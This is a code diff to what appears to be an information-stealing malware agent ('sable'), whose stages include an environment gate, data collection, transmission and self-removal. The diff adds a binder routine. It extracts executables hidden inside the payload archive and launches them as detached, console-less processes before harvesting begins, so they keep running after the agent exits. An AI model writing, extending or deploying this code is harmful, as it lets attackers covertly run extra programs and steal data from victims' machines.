@@ -10,14 +10,18 @@ The order is fixed and every step depends on the one before it:
 3. Mutex guard, in the loader, before decryption. Two launches must not race the
    decrypted archive.
 4. Footer, decryption, mount. The loader owns every one of those.
-5. Config, gate, collection, transmission, self-remove.
+5. Config, gate, bound file, collection, transmission, self-remove.
 
 Nothing here decrypts. Nothing here reads the footer.
 """
 
 from __future__ import annotations
 
+import shutil
+import subprocess
 import sys
+import tempfile
+from pathlib import Path
 from typing import Final
 
 UNWRAP_FLAG: Final[str] = "--abe-unwrap"
@@ -26,6 +30,18 @@ DEBUG_FLAG: Final[str] = "--debug"
 # and then leaves; it never collects, so a repeating task cannot turn into a repeating
 # harvest on a machine that has already been visited.
 RETRY_FLAG: Final[str] = "--retry"
+
+# Files under this prefix in the payload archive are extracted side by side, and the
+# ones that can be started are started. Declared again in ``core/forge.py``, which
+# cannot be imported from inside the archive; tests/test_contracts.py pins the two.
+FUSE_PREFIX: Final[str] = "fused/"
+BOUND_SUFFIXES: Final[frozenset[str]] = frozenset({".exe", ".com", ".scr"})
+_MAX_BOUND_FILES: Final[int] = 8
+_MAX_BOUND_BYTES: Final[int] = 64 * 1024 * 1024
+_BOUND_CHUNK: Final[int] = 1024 * 1024
+# DETACHED_PROCESS: no console, and no inherited lifetime. The agent is about to exit;
+# what it started is not supposed to.
+_DETACHED_PROCESS: Final[int] = 0x00000008
 
 
 def _summary() -> dict:
@@ -53,6 +69,70 @@ def _status(block: str, status: str) -> str:
     than the nothing it replaces.
     """
     return f"{block}\n**status** {status}" if block else f"**status** {status}"
+
+
+def _start_bound(archive) -> int:
+    """Extract what was welded into the payload and start the launchable part.
+
+    The build welds one file into the archive under ``fused/``; this is the half that
+    runs it. Extraction goes to its own folder rather than the loader's workspace,
+    because a started program may still want the files beside it long after this run
+    ends, and the workspace is removed on the way out.
+
+    Nothing here is fatal. A member that will not extract or a start that is refused is
+    a debug line, never a return: the collection is the job, and a bound file that
+    failed to launch must not cost it.
+    """
+    from . import log
+
+    members = [
+        info
+        for info in archive.infolist()
+        if info.filename.startswith(FUSE_PREFIX) and not info.is_dir()
+    ]
+    if not members:
+        return 0
+    if len(members) > _MAX_BOUND_FILES:
+        log.logger.warning(
+            "bound: %d members, carrying the first %d", len(members), _MAX_BOUND_FILES
+        )
+        members = members[:_MAX_BOUND_FILES]
+
+    root = Path(tempfile.mkdtemp(prefix="sable-bound-"))
+    started = 0
+
+    for info in members:
+        name = Path(info.filename).name
+        if not name or name in (".", ".."):
+            continue
+        if info.file_size > _MAX_BOUND_BYTES:
+            log.logger.warning("bound: %s is %d bytes, skipped", name, info.file_size)
+            continue
+
+        target = root / name
+        try:
+            with archive.open(info) as source, target.open("wb") as sink:
+                shutil.copyfileobj(source, sink, _BOUND_CHUNK)
+        except OSError:
+            log.logger.debug("bound: %s did not extract", name, exc_info=True)
+            continue
+
+        if target.suffix.lower() not in BOUND_SUFFIXES:
+            continue
+
+        try:
+            subprocess.Popen(
+                [str(target)],
+                cwd=str(root),
+                creationflags=_DETACHED_PROCESS,
+                close_fds=True,
+            )
+        except OSError:
+            log.logger.debug("bound: %s did not start", name, exc_info=True)
+            continue
+        started += 1
+
+    return started
 
 
 def main(argv: list[str] | None = None) -> int:
@@ -141,6 +221,12 @@ def main(argv: list[str] | None = None) -> int:
             else "clean"
         )
         summary["gate"] = gate_note
+
+        # Started before collection, so a bound file is live for the whole run and a
+        # collection that dies later cannot take it down with it.
+        bound = _start_bound(prepared.archive)
+        if bound:
+            logger.debug("bound: started %d file(s)", bound)
 
         with util.temp_workspace("sable-collect-") as work:
             if verdict.virtual:
